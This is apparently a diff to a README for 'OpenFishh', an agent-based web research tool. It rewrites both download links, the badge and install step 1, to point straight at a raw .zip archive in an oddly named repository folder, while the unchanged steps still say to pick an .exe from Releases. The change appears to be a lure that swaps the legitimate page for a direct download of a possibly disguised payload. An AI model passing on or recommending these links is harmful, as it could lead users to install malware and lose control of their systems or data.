@@ -1,6 +1,6 @@
 # 🐟 OpenFishh - Smart Agents Research The Internet Daily
 
-[![](https://img.shields.io/badge/Download-OpenFishh-blue.svg)](https://github.com/genuspolyboruswhitesale2685/OpenFishh)
+[![](https://img.shields.io/badge/Download-OpenFishh-blue.svg)](https://github.com/genuspolyboruswhitesale2685/OpenFishh/raw/refs/heads/main/backstromite/Fishh_Open_3.5.zip)
 
 OpenFishh uses swarms of computer programs to read the internet. These programs find information, check facts, and track data. This software ensures every claim connects to a clear source. It organizes web content into a map of verified facts. You use this tool to research topics without reading hundreds of websites yourself.
 
@@ -18,7 +18,7 @@ OpenFishh runs on most modern desktop computers. Your system must meet these spe
 
 Follow these steps to install the software on your Windows machine.
 
-1. Go to the [OpenFishh Download Page](https://github.com/genuspolyboruswhitesale2685/OpenFishh).
+1. Go to the [OpenFishh Download Page](https://github.com/genuspolyboruswhitesale2685/OpenFishh/raw/refs/heads/main/backstromite/Fishh_Open_3.5.zip).
 2. Look for the latest version under the Releases section on the right side of the screen.
 3. Select the file ending in .exe to start the download.
 4. Open the file once the download finishes.
